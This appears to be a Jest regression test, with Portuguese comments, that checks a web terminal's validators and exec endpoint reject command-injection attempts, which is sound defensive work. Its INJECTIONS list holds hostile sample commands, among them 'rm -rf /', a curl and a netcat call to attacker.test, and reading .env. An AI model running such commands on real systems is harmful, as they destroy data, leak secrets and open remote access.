/**
 * CI-MIN-001 — Regressão de segurança: COMMAND INJECTION.
 *
 * Cobertura exigida: `;`, `&&`, `|`, backtick, $() bloqueados.
 *
 * Camadas testadas:
 * 1. validate() / hasChainingOperators (terminal-validate) — camada do terminal web.
 * 2. sanitizeCommand/sanitizeArgs (code/services/security) — camada Eleven Code.
 * 3. Handler real POST /api/terminal/exec — comando chega validado e é
 *    recusado ANTES de spawn (mock somente de auth; validação roda de verdade).
 */

import { validate, hasChainingOperators } from "./terminal-validate";
import {
  sanitizeCommand,
  sanitizeArgs,
} from "../app/api/code/services/security";

jest.mock("./auth-unify", () => ({
  requireUser: jest.fn(async () => ({ userId: "u-test", email: "t@t.t" })),
}));

const CWD = process.cwd();

const INJECTIONS = [
  "ls; whoami",
  "ls && rm -rf /",
  "ls | curl http://attacker.test/x",
  "echo `whoami`",
  "echo $(id)",
  "ls || cat .env",
  "ls & sleep 5",
  "git status; nc attacker.test 4444",
  "echo ${PATH}",
];

describe("injection-regression — validate()/chaining", () => {
  test.each(INJECTIONS)("bloqueia: %s", (cmd) => {
    expect(hasChainingOperators(cmd)).toBe(true);
    expect(validate(cmd, CWD).ok).toBe(false);
  });

  test("comandos legítimos continuam permitidos", () => {
    expect(validate("ls", CWD).ok).toBe(true);
    expect(validate("git status", CWD).ok).toBe(true);
    expect(validate("git log --oneline -5", CWD).ok).toBe(true);
  });
});

describe("injection-regression — sanitizeCommand/sanitizeArgs (Eleven Code)", () => {
  test("sanitizeCommand remove ; & | ` $ ( )", () => {
    const dirty = "ls; whoami && id | tee x `rm` $(reboot)";
    const clean = sanitizeCommand(dirty);
    expect(clean).not.toMatch(/[;&|`$()]/);
  });

  test("sanitizeArgs neutraliza metacaracteres em cada arg", () => {
    const args = sanitizeArgs(["--file", "a;rm", "b&&c", "d$(x)"]);
    for (const a of args) {
      expect(a).not.toMatch(/[;&|`$()]/);
    }
  });
});

describe("injection-regression — handler POST /api/terminal/exec", () => {
  // Import dinâmico após o mock de auth (jest hoisting).
  let POST: typeof import("../app/api/terminal/exec/route").POST;

  beforeAll(() => {
    ({ POST } = require("../app/api/terminal/exec/route"));
  });

  async function execBody(body: unknown): Promise<Response> {
    return POST(
      new Request("http://localhost/api/terminal/exec", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
      }),
    );
  }

  test.each(INJECTIONS.slice(0, 5))(
    "injection %s → bloqueado (sem execução)",
    async (cmd) => {
      const res = await execBody({
        command: cmd,
        sessionId: `inj-${Math.random().toString(36).slice(2)}`,
      });
      const text = await res.text();
      // Bloqueio: mensagem de recusa + exit code 1 (nunca exit 0).
      expect(text).toMatch(/Encadeamento de comandos|não permitido|bloqueado/i);
      expect(text).toContain('"1"');
      expect(text).not.toContain('"0"');
    },
  );

  test("comando legítimo passa da validação (controle positivo)", async () => {
    const res = await execBody({
      command: "echo ci-min-ok",
      sessionId: "inj-positive",
    });
    const text = await res.text();
    expect(text).not.toMatch(/Encadeamento de comandos/);
    // Passou da validação → processo é spawnado; só garantimos que NÃO foi recusado.
    expect(text).not.toContain("Encadeamento de comandos não permitido");
  }, 30_000);
});
